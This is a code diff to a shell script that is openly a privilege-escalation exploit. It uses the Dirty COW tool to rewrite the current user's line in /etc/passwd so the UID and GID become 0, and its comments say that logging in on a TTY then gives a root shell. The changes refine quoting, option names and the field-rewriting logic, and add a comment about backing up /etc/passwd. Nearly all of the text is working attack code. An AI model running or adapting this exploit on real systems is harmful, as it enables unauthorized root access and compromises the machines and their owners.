@@ -4,6 +4,8 @@
 #
 # This will likely make the X session unstable. By editing the user's UID in
 # /etc/passwd, many things that check the user's UID (e.g., sudo) will fail.
+# Because of this, the unmodified version of /etc/passwd is backed up to $HOME
+# before performing the exploit.
 #
 # After running this script, switch to a TTY and log in as the current user
 # to gain a root shell.
@@ -14,7 +16,7 @@ backup=$HOME/passwd
 cp /etc/passwd "$backup"
 echoerr "Backed up /etc/passwd to $backup"
 
-offset=$(grep -b ^$USER /etc/passwd | cut -d ':' -f 1)
+offset="$(grep --byte-offset "^$USER" /etc/passwd | cut --delimiter=':' --fields=1)"
 awk -v FS=':' -v USER="$USER" '
 		BEGIN {
 			root_uid = 0;
@@ -32,7 +34,7 @@ awk -v FS=':' -v USER="$USER" '
 				} else if (i == i_uid || i == i_guid) {
 					padding += length($i) - length(root_uid);
 					printf root_uid;
-				} else if (i == i_comment) {
+				} else {
 					printf $i;
 
 					# pad comment to line up with old end of comment
@@ -44,4 +46,4 @@ awk -v FS=':' -v USER="$USER" '
 				printf FS;
 			}
 		}' /etc/passwd \
-	| dirtycow -o $offset /etc/passwd
+	| dirtycow -o "$offset" /etc/passwd
